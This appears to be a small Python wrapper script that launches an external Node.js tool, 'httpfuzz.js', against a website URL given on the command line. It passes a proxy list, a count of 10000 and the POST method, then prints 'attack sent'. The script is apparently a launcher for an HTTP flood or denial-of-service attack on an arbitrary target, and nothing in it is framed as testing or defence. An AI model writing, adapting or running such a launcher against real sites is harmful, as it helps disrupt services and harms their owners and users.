import sys
import subprocess

if len(sys.argv) < 2:
    print("Please provide the website URL as a command line argument.")
    sys.exit(1)

website = sys.argv[1]
subprocess.Popen(["node", "httpfuzz.js", website, "proxy.txt", "10000", "POST"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
print("attack sent")
